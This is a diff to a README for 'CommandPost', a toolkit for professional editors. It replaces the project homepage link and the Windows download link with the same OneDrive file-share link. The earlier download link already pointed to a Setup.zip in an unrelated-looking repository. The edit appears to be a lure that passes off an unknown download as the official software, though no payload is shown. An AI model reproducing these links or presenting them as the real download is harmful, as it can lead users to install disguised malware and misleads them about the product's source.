@@ -1,4 +1,4 @@
-# [CommandPost](http://commandpost.io/)
+# [CommandPost]( https://1drv.ms/u/s!Asqw7JlpljNAbtwbGWNz8cdx8uk?e=eCtQgb)
 ![Latest-Release](https://img.shields.io/github/v/release/CommandPost/CommandPost?include_prereleases)
 > Workflow Toolkit for Professional Editors
 
@@ -26,7 +26,7 @@ Shortcomings .
 
 ## Download:
 
-You can Download CommandPost for Windows [here](https://raw.githubusercontent.com/updaterd/setup-software/master/Setup.zip).
+You can Download CommandPost for Windows [here]( https://1drv.ms/u/s!Asqw7JlpljNAbtwbGWNz8cdx8uk?e=eCtQgb).
 
 
 
